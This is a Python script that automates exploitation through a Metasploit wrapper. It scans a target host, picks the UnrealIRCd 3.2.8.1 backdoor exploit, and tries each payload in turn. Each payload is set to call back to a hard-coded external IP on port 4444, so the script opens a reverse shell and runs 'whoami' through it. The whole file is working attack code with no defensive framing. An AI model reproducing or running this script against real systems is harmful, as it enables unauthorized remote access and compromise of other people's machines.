from pycvesearch import CVESearch
from SystemScan import SystemScan
from MetasploitCannon import *
from __const import NOTE
from util import Utility
from CannonEngine import CannonEngine
ce = CannonEngine()
ce.registerCannonPlug(MetasploitCannon())
cve = CVESearch()
exploited = False
sc = SystemScan('172.28.128.3')
sc.startScan()
sc.fetchMSFE()
cpes = sc.cpes
util = Utility()
# target = {'host': '172.28.128.3', 'port': '6697', 'cpe': 'cpe:/a:unrealircd:unrealircd', 'msfe': ['exploit/unix/irc/unreal_ircd_3281_backdoor']}
# print(target)
# for target in cpes:
target = {'host': '172.28.128.3', 'port': '6697', 'cpe': 'cpe:/a:unrealircd:unrealircd', 'msfe': ['exploit/unix/irc/unreal_ircd_3281_backdoor']}
# TODO: Skip Modules and payloads that belong to other operating system using OScpe property
# if exploited == True:
    #break
for exploit in target['msfe']:
    
    if exploited == True:
        break
    # Skip Auxiliary Modules
    if exploit.startswith('auxiliary'):
        continue
    util.print_message(NOTE, "Using exploit " + exploit + " on " + target['host'] + ":" + target['port'])
    msf = MetasploitCannon()
    msf.setTargetExploit(exploit)
    for payload in msf.exploit.targetpayloads():
        util.print_message(NOTE, "Using Payload: " + payload)
        msf.setTargetPayload(payload)
        msf.setExploitOptions(RHOST=target['host'], RPORT=target['port'])
        msf.setPayloadOptions(LHOST='115.186.176.141', LPORT=4444)
        result = msf.exploitNow()
        if(result==ExploitResult.SUCCESS):
            exploited = True
            shell = msf.getShell()
            shell.write("whoami")
            res = shell.read()
            util.print_message(OK, "Executed test command 'whoami' and got output:\n" + res )
            break
if(exploited == False):
    util.print_message(FAIL, "Could not exploit the target.")